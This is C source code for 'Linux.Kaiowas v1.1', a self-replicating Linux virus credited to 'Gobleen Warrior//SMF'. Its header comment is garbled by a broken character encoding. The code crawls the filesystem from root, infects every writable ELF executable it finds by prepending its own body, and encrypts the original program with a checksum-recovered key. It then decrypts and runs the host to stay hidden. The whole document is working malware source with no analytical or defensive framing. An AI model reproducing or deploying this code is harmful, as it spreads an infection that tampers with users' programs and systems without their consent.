   //
   //                           <Linux.Kaiowas v1.1>
   //
   // Ž¯â¨¬¨§¨à®¢  ï ¨ ¤®¯®«¥ ï ¢¥àá¨ï ¢¨àãá . ’¥¯¥àì ¤®¯¨áë¢ ¥¬ë¥ ¡«®ª¨
   // ®à¨£¨ «ì®£® ä ©«  è¨äàãîâáï á ¯¥à¥¬¥ë¬ ª«îç®¬, ª®â®àë© ¨£¤¥ ¥
   // á®åà ï¥âáï,   ¯®¤¡¨à ¥âáï ¯à¨ ¯®¬®é¨ ç¥âëà¥å¡ ©âëå ª®âà®«ìëå áã¬¬ ¡«®ª 
   // ¯à¨ à áè¨äà®¢ª¥ ®®£® ¡«®ª  (RDA). *â¨ ª®âà®«ìë¥ áã¬¬ë åà ïâáï ¯¥à¥¤
   // ¡«®ª®¬, ª®â®àë© ®¨ ¯à¥¤áâ ¢«ïîâ, ¢ § è¨äà®¢ ®¬ â¥«¥ ®à¨£¨ «ì®£® ä ©« .
   //
   // 20.04.01                                      (c) Gobleen Warrior//SMF

   #include <sys/types.h>
   #include <sys/stat.h>
   #include <fcntl.h>
   #include <unistd.h>
   #include <stdio.h>
   #include <string.h>

   #define virus_len 9552
   #define byte_block virus_len
   #define name_len sizeof(our_name)

   char our_name[] = "Linux.Kaiowas v1.1 by Gobleen Warrior//SMF";

   int our_fd, tmp_fd;
   char buffer[byte_block], buffer1[byte_block], vir_buf[virus_len];

   int main(int argc, char **argv, char **envp)
   {
       char *exec_tmp;
       ssize_t bytes_cnt;
       pid_t pid;
       if ((our_fd = open(argv[0], O_RDONLY)) != -1)
       {
           if (read(our_fd, vir_buf, virus_len) == -1) exit(-1);
           exec_tmp = tempnam(NULL, argv[0]);
           if ((tmp_fd = open(exec_tmp, O_WRONLY|O_CREAT|O_TRUNC, 0400|0200|0100)) == -1)
           {
               close(our_fd);
               exit(-1);
           }
           while(1)
           {
               unsigned csum0;
               if (read(our_fd, &csum0, 4) != 4) break;
               bytes_cnt = read(our_fd, buffer, byte_block);
               if (bytes_cnt == 0) break;
               for(;;)
               {
                   int key = rand() % 10;
                   int i;
                   unsigned csum=0;
                   for(i=0; i<bytes_cnt; i++)
                   {
                       buffer1[i] = buffer[i] ^ key;
                       key += our_name[i % name_len] ^ i;
                   }
                   for(i=0; i<bytes_cnt; i++)
                   {
                       csum += buffer1[i] ^ i;
                       csum = (csum >> 1) | (csum << 31);
                   }
                   if (csum == csum0) break;
               }
               write(tmp_fd, buffer1, bytes_cnt);
           }
           close(tmp_fd);
           close(our_fd);
           pid = fork();
           if (pid == 0)
           {
               execve(exec_tmp, argv, envp);
               exit(-1);
           }
           else if (pid > 0)
           {
               int process_file(const char *, const struct stat *, int);
               ftw("/", process_file, 1);
           }
           exit(0);
       }
   }//main

   int process_file(const char *vic_name, const struct stat *status, int type)
   {
       int vic_perm, vic_fd, bytes_cnt;
       vic_perm = status->st_mode;
       if((status->st_mode&S_IFREG) && (status->st_mode&(S_IXUSR|S_IXGRP|S_IXOTH)))
       {
           char *tmp_name;
           if (chmod(vic_name, S_IRUSR|S_IWUSR) == -1) return 0;
           if ((vic_fd = open(vic_name, O_RDWR)) == -1)
           {
               chmod(vic_name, vic_perm);
               return 0;
           }
           tmp_name = tempnam(NULL, "GWI");
           if ((tmp_fd = open(tmp_name, O_WRONLY|O_CREAT|O_TRUNC, 0400|0200|0100)) == -1)
           {
               close(vic_fd);
               chmod(vic_name, vic_perm);
               return 0;
           }
           if ((bytes_cnt = read(vic_fd, buffer, byte_block)) == -1)
           {
               close(vic_fd);
               close(tmp_fd);
               unlink(tmp_name);
               chmod(vic_name, vic_perm);
               return 0;
           }
           if (bytes_cnt > name_len)
           {
               char *i;
               for(i=buffer; i<(buffer+byte_block-name_len); i++)
               {
                   if ((!strcmp(i, our_name)) || (strncmp(buffer+1, "ELF", 3)))
                   {
                       close(vic_fd);
                       close(tmp_fd);
                       unlink(tmp_name);
                       chmod(vic_name, vic_perm);
                       return 0;
                   }
               }
           }
           lseek(vic_fd, 0, SEEK_SET);
           write(tmp_fd, vir_buf, virus_len);
           lseek(our_fd, 0, SEEK_SET);
           while((bytes_cnt = read(vic_fd, buffer, byte_block)) > 0)
           {
               int i;
    // En-crypt
               int key = rand() % 10;
               unsigned csum=0;
               for(i=0; i<bytes_cnt; i++)
               {
                 csum += buffer[i] ^ i;
                 csum = (csum >> 1) | (csum << 31);
               }
               for(i=0; i<bytes_cnt; i++)
               {
                 buffer[i] ^= key;
                 key += our_name[i % name_len] ^ i;
               }
               // } en-crypt
               write(tmp_fd, &csum, 4);


               write(tmp_fd, buffer, bytes_cnt);
           }
           close(vic_fd);
           close(tmp_fd);
           if (rename(tmp_name, vic_name) == -1)
           {
                   close(tmp_fd);
                   unlink(tmp_name);
                   chmod(vic_name, vic_perm);
                   return 0;
           }
           chmod(vic_name, vic_perm);
       }
       return 0;
   }//process_file
